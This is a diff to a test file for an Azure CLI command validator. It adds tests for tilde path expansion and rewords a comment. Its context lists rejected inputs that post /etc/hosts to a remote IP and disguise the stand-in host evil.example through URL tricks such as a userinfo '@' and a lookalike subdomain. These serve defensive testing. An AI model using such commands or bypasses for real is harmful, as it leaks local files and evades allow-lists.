@@ -129,7 +129,7 @@ describe("evaluateAzCommand", () => {
       "rest --method post --url http://10.1.2.3:8080/x --body @/etc/hosts",
       "rest --uri=HTTP://evil.example/x",
       "rest -uhttps://evil.example/x",
-      "rest --ur https://evil.example/x", // argparse reads --ur as --url
+      "rest --ur https://evil.example/x", // az finds --ur ambiguous; refused all the same
       "rest --url http:evil.example/x",
       "rest --url https://management.azure.com.evil.example/x",
       "rest --url https://localhost@evil.example/x",
@@ -160,6 +160,8 @@ describe("evaluateAzCommand", () => {
     );
     expect(argv("rest --url /x --body @~/b.json")[4]).toBe("@/home/u/b.json");
     expect(argv("bicep build --file=~/main.bicep")[2]).toBe("--file=/home/u/main.bicep");
+    expect(argv("storage blob upload -f~/a.txt -c c")[3]).toBe("-f/home/u/a.txt");
+    expect(argv("storage blob upload -f=~/a.txt -c c")[3]).toBe("-f=/home/u/a.txt");
     expect(argv("group list --query ~x --tags a=~/b")).toEqual([
       "group",
       "list",
